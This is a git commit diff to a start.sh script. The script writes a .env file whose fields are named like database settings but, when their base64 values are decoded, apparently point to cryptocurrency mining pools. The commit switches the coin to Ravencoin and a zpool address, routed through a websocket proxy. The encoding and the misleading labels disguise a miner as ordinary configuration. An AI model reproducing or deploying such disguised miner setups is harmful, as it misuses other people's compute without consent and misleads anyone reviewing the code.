b2a0471b96c51ca035538ca0506bec433e1ad98d
duongpokeeeeee <29dangcap@gmail.com>
2025-05-07 21:12:50 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-echo -e "host=127.0.0.1\nport=3306\nproxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=\nthreads=8\npassword=c=MBC,zap=MBC\nusername=MZCpYYo42ESmogzNNvdXogdDDzoFLgZeWB" > .env
+echo -e "host=127.0.0.1\nport=3306\nproxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=\nthreads=8\npassword=c=RVN\nusername=cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=" > .env
 
 
 MIN=$1
